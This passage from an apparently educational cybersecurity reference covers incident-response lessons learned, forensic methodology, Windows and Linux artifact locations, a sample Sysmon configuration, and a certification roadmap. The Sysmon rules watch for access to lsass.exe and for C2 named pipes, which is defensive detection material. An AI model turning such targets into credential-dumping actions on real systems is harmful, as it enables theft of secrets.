**Phase 6: Lessons Learned**
- Root cause analysis report
- Improve detection rules
- Update security controls
- Train staff
- Legal reporting if required

**Digital Forensics Methodology:**
1. Identification — Identify potential evidence
2. Preservation — Create forensic images (write-blockers, hash verification)
3. Collection — Collect evidence following chain of custody
4. Examination — Process evidence (recover files, analyze artifacts)
5. Analysis — Correlate, timeline, determine activity
6. Reporting — Document findings

**Forensic Artifacts (Windows):**
- Prefetch files (C:\Windows\Prefetch)
- Amcache (C:\Windows\AppCompat\Programs\Amcache.hve)
- ShimCache (registry: AppCompatCache)
- SRUM (System Resource Usage Monitor)
- Event logs (Security, System, PowerShell, Sysmon)
- Jumplists, Recent files
- LNK files
- Registry (NTUSER.DAT, SAM, SYSTEM, SOFTWARE)
- USN Journal
- Volume Shadow Copies
- Browser history, cache, cookies
- Memory dump (full memory, hiberfil.sys, pagefile.sys)

**Forensic Artifacts (Linux):**
- /var/log/ (auth.log, syslog, messages, kern.log)
- ~/.bash_history
- /var/log/wtmp, /var/log/btmp
- /var/log/lastlog
- ~/.ssh/authorized_keys
- /tmp files
- process memory (/proc/PID/mem)
- Docker/container logs
- Auditd logs (/var/log/audit/audit.log)

### 13.6 Sysmon (System Monitor)

```xml
<!-- Sysmon config example -->
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <!-- Log process creation -->
    <ProcessCreate onmatch="include"/>
    
    <!-- Log network connections -->
    <NetworkConnect onmatch="include"/>
    
    <!-- Log file creation (especially executables and scripts) -->
    <FileCreateTime onmatch="exclude"/>
    <FileCreate onmatch="include">
      <TargetFilename condition="end with">.exe</TargetFilename>
      <TargetFilename condition="end with">.dll</TargetFilename>
      <TargetFilename condition="end with">.ps1</TargetFilename>
      <TargetFilename condition="end with">.vbs</TargetFilename>
      <TargetFilename condition="end with">.js</TargetFilename>
    </FileCreate>
    
    <!-- Log process access (especially LSASS) -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="end with">lsass.exe</TargetImage>
    </ProcessAccess>
    
    <!-- Log named pipe creation (C2 pipes) -->
    <NamedPipeEvent onmatch="include"/>
  </EventFiltering>
</Sysmon>
```



---

## 14. Certifications Roadmap

### 14.1 Entry Level

**CompTIA Security+**
- Level: Entry
- Cost: ~$370
- Difficulty: Easy
- Focus: General security fundamentals, risk management, cryptography, network security
- Best for: Starting in cybersecurity or SOC roles
- Study: Professor Messer videos, Darril Gibson book, practice tests
- Exam: SY0-601 (or SY0-701), 90 minutes, 90 questions, max 750/900

**CompTIA Network+**
- Level: Entry
- Cost: ~$350
- Difficulty: Easy
- Focus: Networking fundamentals, protocols, troubleshooting
- Best for: Understanding network basics before hacking
- Exam: N10-008

### 14.2 Intermediate / Ethical Hacking

**CEH (Certified Ethical Hacker) — EC-Council**
- Level: Intermediate
- Cost: ~$1,200 (exam + training)
- Difficulty: Medium
- Focus: 20 modules covering all phases of ethical hacking
- Covers: Reconnaissance, scanning, enumeration, exploitation, post-exploitation, web apps, wireless, mobile, cloud, IoT
- Best for: Understanding broad hacking methodology
- Criticisms: More theory than practical, expensive, some consider it outdated
- Study: EC-Council official courseware, CEH v12 AIO book, Boson practice exams
- Exam: 312-50, 4 hours, 125 questions

**CompTIA PenTest+**
- Level: Intermediate
- Cost: ~$370
- Difficulty: Medium
- Focus: Penetration testing methodology, hands-on skills
- Best for: Alternative to CEH (more practical, cheaper)
- Study: Jason Dion course, Sybex study guide
- Exam: PT0-002, 165 minutes, up to 85 questions

### 14.3 Advanced Practical (Offensive Security)

**OSCP (Offensive Security Certified Professional)**
- Level: Advanced
- Cost: ~$1,600 (including 90 days lab + exam attempt)
- Difficulty: Hard
- Focus: Hands-on penetration testing, buffer overflows (old format), web attacks, privilege escalation, Active Directory
- Exam: 24-hour practical exam + 24-hour report writing
- Best for: Gold standard for offensive security roles
- Requires: 5 standalone boxes in 24 hours, 70 points out of 100 to pass
- Study: PWK/OSCP courseware, TJ Null's OSCP list, HackTheBox (retired machines), PG Practice
- Key for: Real penetration testing jobs, red team roles

**OSWP (Offensive Security Wireless Professional)**
- Level: Intermediate
- Cost: Included with some Learn subscriptions
- Difficulty: Medium
- Focus: Wireless penetration testing (WPA2, WPA3, WPS, Evil Twin)
- Study: PWK wireless courseware

**OSED (Offensive Security Exploit Developer)**
- Level: Expert
- Cost: ~$1,600
- Difficulty: Very Hard
- Focus: Windows exploit development, ASLR/DEP bypass, ROP chains
- Study: EXP-301 course

**OSEP (Offensive Security Experienced Penetration Tester)**
- Level: Expert
- Cost: ~$1,600
- Difficulty: Very Hard
- Focus: Advanced evasion, Active Directory exploitation, custom C2, AV/EDR bypass
- Study: PEN-300 courseware
- Best for: Red team roles, advanced penetration testers

**OSWE (Offensive Security Web Expert)**
- Level: Advanced-Expert
- Cost: ~$1,600
- Difficulty: Very Hard
- Focus: Advanced web application attacks, source code review, white-box testing
- Covers: Java, .NET, PHP web applications, custom exploits
- Exam: 48-hour practical with source code review
- Study: AWAE/WEB-300 course

### 14.4 Defensive / Blue Team

**GCIA (GIAC Certified Intrusion Analyst)**
- Level: Intermediate-Advanced
- Cost: ~$2,000 (exam + practice)
- Difficulty: Hard
- Focus: Packet analysis, IDS/IPS, traffic analysis, log correlation
- Best for: SOC analysts, incident responders
- Study: SANS SEC503

**GCIH (GIAC Certified Incident Handler)**
- Level: Intermediate
- Cost: ~$2,000
- Difficulty: Medium-Hard
- Focus: Incident response, handling methodology, detection
- Study: SANS SEC504

**GPEN (GIAC Penetration Tester)**
- Level: Intermediate-Advanced
- Cost: ~$2,000
- Difficulty: Hard
- Focus: Penetration testing methodology, practical
- Best for: Alternative to OSCP (different approach)
- Study: SANS SEC560

**GCFA (GIAC Certified Forensic Analyst)**
- Level: Advanced
- Cost: ~$2,000
- Difficulty: Hard
- Focus: Advanced digital forensics, memory analysis
- Study: SANS FOR508

### 14.5 Expert Level

**CISSP (Certified Information Systems Security Professional) — ISC2**
- Level: Expert
- Cost: ~$750 (exam)
- Difficulty: Hard
- Focus: Broad security management (8 domains): Security and Risk Management, Asset Security, Security Architecture, Communication and Network Security, Identity and Access Management, Security Assessment and Testing, Security Operations, Software Development Security
- Best for: Security management, leadership, CISO roles
- Requires: 5 years experience in 2+ domains
- Exam: 3 hours, 125-175 questions (CAT), 700/1000 to pass
- Study: OSG (Official Study Guide), Sybex official, Luke Ahmed videos, Boson
- Note: Managerial focus, not technical

**CASP+ (CompTIA Advanced Security Practitioner)**
- Level: Expert
- Cost: ~$500
- Difficulty: Hard
- Focus: Enterprise security, risk management, integration
- Best for: Security architects

### 14.6 Cloud Security

**CCSP (Certified Cloud Security Professional) — ISC2**
- Level: Advanced
- Cost: ~$750
- Difficulty: Hard
- Focus: Cloud architecture, data security, compliance
- Best for: Cloud security roles

**AWS Security Specialty**
- Level: Intermediate-Advanced
- Cost: ~$300
- Difficulty: Medium-Hard
- Focus: AWS-specific security (IAM, S3, VPC, encryption, monitoring)
- Study: ACloudGuru, TutorialsDojo, AWS documentation

**Azure Security Engineer (AZ-500)**
- Level: Intermediate-Advanced
- Cost: ~$165
- Difficulty: Medium-Hard
- Focus: Azure security controls, identity, platform protection

### 14.7 Certification Roadmap

```
Beginner:                    Security+ / Network+
                              |
Intermediate:                CEH / PenTest+ / CCNA
                              |
Advanced Practical:          OSCP / GPEN
                              |
Expert Offensive:            OSEP / OSWE / OSED
                              |
Expert Defensive:            CISSP / GCIH / GCFA
                              |
Specialized:                 AWS Security / CCSP / CRISC
```

**Recommended Learning Platforms:**
- HackTheBox — Practical boxes
- TryHackMe — Guided learning
- VulnHub — Downloadable VM challenges
- PentesterLab — Web-specific challenges
- PortSwigger Web Security Academy — Free web security labs
- PicoCTF — Capture the flag for beginners
- Offensive Security Proving Grounds — OSCP-like practice
- RangeForce — Hands-on cyber range
- Immersive Labs — Enterprise cyber skills

**Recommended Books:**
- The Web Application Hacker's Handbook (Stuttard)
- The Hacker Playbook 3 (Kim)
- Penetration Testing: A Hands-On Introduction (Georgia Weidman)
- Red Team Field Manual (RTFM)
- Blue Team Field Manual (BTFM)
- Practical Malware Analysis (Sikorski)
- Attacking Network Protocols (Hanna)
- Windows Internals (Russinovich)
- The Art of Exploitation (Erickson)
- Black Hat Python (Seitz)
- Wicked Cool Shell Scripts (poole)

---

*This cybersecurity knowledge base covers the full spectrum of offensive and defensive security disciplines. It is designed as a comprehensive reference for educational understanding, CTF participation, bug bounty hunting, and defensive security implementation.*

*Use this knowledge ethically and legally. Never deploy these techniques against systems you do not own or have explicit written authorization to test.*

---
